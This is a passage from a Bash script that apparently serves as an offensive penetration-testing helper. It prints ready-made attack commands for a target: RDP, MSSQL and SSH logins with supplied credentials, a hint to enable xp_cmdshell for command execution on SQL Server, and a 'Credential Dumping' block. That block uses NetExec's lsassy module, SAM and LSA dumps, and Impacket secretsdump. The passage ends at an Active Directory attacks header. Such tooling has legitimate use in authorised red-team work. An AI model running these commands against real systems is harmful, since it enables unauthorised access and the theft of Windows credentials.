            else
                p_cmd_display "${RDP_BIN} /v:${ip}:${port} /u:'${user}' /p:'${cred}' ${RDP_CERT} /dynamic-resolution +clipboard"
            fi
            ;;
        mssql)
            p_cmd_display "$(imp mssqlclient) ${auth_imp} -windows-auth"
            p_cmd_display "# In mssqlclient: enable_xp_cmdshell → xp_cmdshell whoami /all"
            ;;
        ssh) p_cmd_display "ssh '${user}'@${ip} -p ${port}" ;;
    esac

    # Credential dumping
    lprint "${BOLD}  [2] Credential Dumping${NC}"
    p_cmd_display "${NXC} smb ${ip} --port ${port:-445} ${auth_nxc} -M lsassy"
    p_cmd_display "${NXC} smb ${ip} --port ${port:-445} ${auth_nxc} --sam"
    p_cmd_display "${NXC} smb ${ip} --port ${port:-445} ${auth_nxc} --lsa"
    p_cmd_display "$(imp secretsdump) ${auth_imp}"

    # AD Attacks
    lprint "${BOLD}  [3] Active Directory${NC}"
